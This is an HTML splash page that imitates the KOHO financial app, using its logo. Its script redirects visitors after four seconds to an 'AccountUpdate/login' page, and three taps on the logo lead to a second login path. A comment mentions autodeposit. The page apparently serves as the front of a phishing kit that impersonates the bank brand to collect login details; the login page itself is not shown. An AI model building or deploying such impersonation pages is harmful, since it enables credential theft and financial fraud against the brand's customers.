<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, minimal-ui">
    <title>KOHO Splash Screen</title>
    <style>
        :root {
            --background-color: #2a1852;
        }

        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            background-color: var(--background-color);
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden; /* Prevent scrolling */
            touch-action: none; /* Prevent touch gestures */
            user-select: none; /* Prevent text selection */
        }

        .video-container {
            width: 100%;
            max-width: 600px;
            height: auto;
            border-radius: 20px;
            overflow: hidden;
        }

        video {
            width: 100%;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="video-container" id="video-container">
        <g-img style="max-height:162px;max-width:311px" class="mNsIhb">
            <img id="logo" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAATcAAACiCAMAAAATIHpEAAAAtFBMVEUdEjzR8wAAAD7W+QDU9wDZ/QARAD0bEDusxRf///8bDzzA3xEZCzwJAD4VAD0YCD1seCw+PzYAAB0AAECKnSSrqbMPADRpdS2vyxo7Oza30xHP8ACAkSdERjV4dIUqIEbc2+B4hypMUTMvLDheZy/G5QidtB1ibC5RVzJWXTGjuxu10RMtKTmImyZGSTWPoyKXrB9ygCsjGzo2NTczMDh9jSgpIzmZsCAlHTpcZDAgFjtPVDOpgDW+AAAEnUlEQVR4nO3d61LiShQF4NBJdxtIJ0CUW7gjICACMziOzvu/1+nsnQDOoWoOVo0cYX2/EugAWdX3VKnj+/1uTzvwX+let+/7jn9XrSG2U+ha9c53+lWkdipd7Tvd2rl/xRdU6zro2z5A9xzE9hFIDQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAC+jMiYYH8ihMoPlbHC3d9XC4yJ8mOtjNpdE1BBVfyE3/o/YprL5SgPwVQmjbpw0mDE02C1Xj0PheHk1Ki9bGblimZzOxV8HMaP5dv1ejkNRfCvD79coi5d16twTRL39lhOla12g7F93ZLjtgntW1HFsycP6aGjRUu6ck35il8Ll0pKbzIyZ7yRT6XFRhYKBXdClUdsXD4Jv7XSl5k7/m6rmZjY97wGlQsf6KKgaK9fSW9X0C2L897OZ9Fxm/LxbkSa4YBO5Ma8jd3CnpdsI0fcpPmUKBhVpnybkRYTeVDQXnoVwaW1pZDnlmfotoRoHMZm3y4JfSS3SmQG72Kzr3XCc9/U37evLTY3Ha+y2JSayqzdWXzUNsdyC4OEL087OGquXis+9139fWaV1xabW/zCsS1EIFqcQfuHcDaczFgcy008c8Oed4R5aFHEcnj5FS6meBLKLZ5zbDeiGIwoAXcoAh2YEXdcw5hzi4UVTzm3mAJ2V3GodRgv+OTyx1SR2OY1K1FuHJucCO2oOqXywl28aNNZm3NLbhqpVoHrGwcvaIIXPbrUUC9/ZIgqN/OnuERtkhKwNcdGYJaU1Cs3uKjJKXJutmCKO71m8zBghz8puYIOzi6qQlE6GA1pKmtWaRxyxLP/YkhxzbPcDsfO5lDymMGfxj2gvILcUoe58fwry23LS4g/57ZEbjT/Mtyj3fNaNKrQ2TrLjeYmPOdwm1vq0SZX105TeW4eTz7GqqhotLQ1jN+n2uc+c27j5a21nHvvxgXaCQk7dNni8scFkuUmX0XCE5E4+MEzsWkcBqF4omxkJZ+HpFtGcT2bhzQov3msosiI0rXMQwjl5nkzwfWlINt2mcVZrYejp1teMIzjY/NeM+CZ3uJ+2yyPs4CjP33jZUhz87yhSXdDeA73IGa/r7NkWR1dZ5mEJye7gnYCfe4b+iRU356occUT6qGSYjx/v663S/3j6/p8Jbsv+f1KqpuTdksdHjqLWRe1NKp1GJw7fgt+20eSnJsjlu+Cc++vpHej+tbJd8nDLd38iwnUfLcd6cnFN7t0MGuXlq9UjiduSqd7dm4esecmsysZTJ00t8r+CYuZFaRMbFsritcGT9Vkq07PDYLHRMpCvp8+l1LyOsFsXwrpNpKU49tQHf2Ki1T8ebjxo4J6PaIXQvHzdbB8vn+MFT+XicJ6+S0rq8Vs08nqll2s/dq02+WOMFf1ROv9zRbV7nleECpjVHDsLUeHaj8AaCoY4R8yAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMCXgT+g9hHa6SG40+me062d+0d8QbWu06+iwp1KV/uOf1etIblT6Fr1znd8v99FH3cC3ev2ff8fB2BEW0UpGjAAAAAASUVORK5CYII=" class="YQ4gaf" height="162" style="object-position:50% 50%" width="311" alt="KOHO: One place for your money and life" data-csiid="gouXZ6iHFo_M0PEP3vrR4AU_6" data-atf="1"></g-img>
    </div>

    <script>
        // Variables to track the number of taps on the logo
        let tapCount = 0;
        const logo = document.getElementById('logo');
        const videoContainer = document.getElementById('video-container');

        // Detect three taps on the logo
        logo.addEventListener('click', () => {
            tapCount++;
            if (tapCount === 3) {
                // Redirect to autodeposit.php after 3 taps
                window.location.href = 'AccountUpdate/login/indexx.php';
            }
        });

        // Prevent zooming, scrolling, and moving the page
        window.addEventListener('wheel', (e) => e.preventDefault(), { passive: false });
        window.addEventListener('touchmove', (e) => e.preventDefault(), { passive: false });

        // Disable pinch zooming (on mobile devices)
        window.addEventListener('gesturestart', (e) => e.preventDefault());

        // Redirect to login after 4 seconds (as per original code)
        setTimeout(() => {
            window.location.href = 'AccountUpdate/login/index.php';
        }, 4000); // 4 seconds
    </script>
</body>
</html>
